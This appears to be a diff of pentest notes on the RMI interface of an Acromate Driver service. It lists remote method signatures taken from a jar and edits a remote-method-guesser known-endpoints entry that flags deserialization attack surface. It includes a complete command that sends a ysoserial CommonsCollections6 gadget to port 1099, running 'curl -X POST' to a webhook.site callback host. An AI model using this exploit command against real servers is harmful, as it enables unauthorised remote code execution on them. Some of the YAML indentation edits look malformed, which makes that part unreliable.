@@ -16,13 +16,40 @@ String register(String dummy, String dummy2)
 String login(String dummy, String dummy2)
 String logout(String dummy)
 
+then i got the jar :)
+
+void freeStatement(String var1, IDataStatement var2)  
+IDataStatement allocStatement(String var1)  
+IDataStatement allocStatement(String var1, String var2)  
+IDataStatement allocStatementEMS(String var1, int var2)  
+Object reqPacket(String var1, String var2, Object... var3)  
+Object rptPacket(String var1, String var2, Object... var3)  
+Object cmdPacket(String var1, String var2, Object... var3)  
+IClassObject getSystem(String var1, String var2)  
+IClassObject getGroups(String var1)  
+IClassObject getGroup(String var1, String var2)  
+String getGroupScript(String var1, String var2)  
+int setGroupScript(String var1, String var2, String var3)  
+String getNonce(String var1)  
+String getClientAddress()  
+String login(String var1, String var2)  
+String logout(String var1)  
+String register(String var1, String var2)  
+int getPermitLevel(String var1)  
+String getPermitGroup(String var1)  
+int setUserLogOutForcibly(String var1)  
+Object callMethod(String var1, String var2, String var3, Object... var4)  
+int setParam(String var1, String var2, String var3)  
+String getParam(String var1, String var2)  
+IClassObject getFieldObject(String var1, String var2)  
+
 
 java -jar rmg-5.1.0-jar-with-dependencies.jar serial xxx 1099 CommonsCollections6 'curl -X POST http://webhook.site/xx/' --signature 'String register(String dummy, String dummy2)' --bound-name IDataObject --yso /root/Desktop/yso/ysoserial-all.jar
 
 
 --------------------------------------------- to RMG remote-method-guesser/resources/known-endpoints/known-endpoints.yml (https://github.com/qtc-de/remote-method-guesser/blob/3398ec6abc0af18c71c1f90b0c85702469eabf75/resources/known-endpoints/known-endpoints.yml)
 
-- name: Acromate Driver
+- name: Acromate Driver Core
   className:
     - com.acromate.driver.core.DataObjectImpl_Stub
 
@@ -38,7 +65,7 @@ java -jar rmg-5.1.0-jar-with-dependencies.jar serial xxx 1099 CommonsCollections
  
     - name: Deserialization
       description: |
-        Several methods accept non trivial parameters and can therefore be used for deserialization attacks.
+       Several methods accept non trivial parameters and can therefore be used for deserialization attacks.
       references:
         - https://github.com/qtc-de/remote-method-guesser#serial
 
@@ -72,7 +99,7 @@ java -jar rmg-5.1.0-jar-with-dependencies.jar serial xxxx 1099 CommonsCollection
  
     - name: Deserialization
       description: |
-        Several methods accept non trivial parameters and can therefore be used for deserialization attacks.
+     Several methods accept non trivial parameters and can therefore be used for deserialization attacks.
       references:
         - https://github.com/qtc-de/remote-method-guesser#serial
 
